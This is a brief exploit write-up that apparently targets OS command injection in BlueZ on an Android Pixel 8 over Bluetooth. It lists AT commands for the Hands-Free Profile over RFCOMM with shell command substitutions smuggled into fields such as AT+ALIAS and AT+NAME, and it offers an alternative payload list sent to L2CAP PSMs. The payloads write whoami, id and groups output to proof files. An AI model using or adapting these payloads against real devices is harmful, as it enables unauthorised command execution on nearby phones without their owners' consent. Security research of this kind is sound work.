Os command injection via Bluez Bluetooth

- Sends raw Bluetooth protocol messages
- Exploits Bluez via HFP/HSP profiles
- Targets Android Pixel 8 over Bluetooth
- Verifies exploitation via ADB after successful attack, currently commented out

Sends an AT command via HFP (Hands-Free Profile) over RFCOMM
RFCOMM provides a serial port emulation over Bluetooth


AT commands for the HFP over RFCOMM being used.

```
at_commands = [
            (f"AT+ALIAS=$(touch /data/local/tmp/bluez_overtheair_{self.timestamp}_proof.txt)", "create_proof"),
            (f"AT+NAME=Device$(whoami > /data/local/tmp/bluez_overtheair_{self.timestamp}_whoami.txt)", "whoami"),
            (f"AT+CCWA=$(id > /data/local/tmp/bluez_overtheair_{self.timestamp}_id.txt)", "id"),
            (f"AT+NREC=$(groups > /data/local/tmp/bluez_overtheair_{self.timestamp}_groups.txt)", "groups"),
        ]
```

Alternative: Exploit via L2CAP PSM (Protocol Service Multiplexer)

```
    self.log("\nPhase 3: L2CAP Protocol Exploitation (Alternative)", "*")

    # L2CAP PSM 0x1001 is sometimes used for custom services
    psm_commands = [
    (0x1001, f"pwn:whoami > /data/local/tmp/bluez_ota_{self.timestamp}_whoami_l2cap.txt"),
    (0x1003, f"cmd:id > /data/local/tmp/bluez_ota_{self.timestamp}_id_l2cap.txt"),
    ]
```


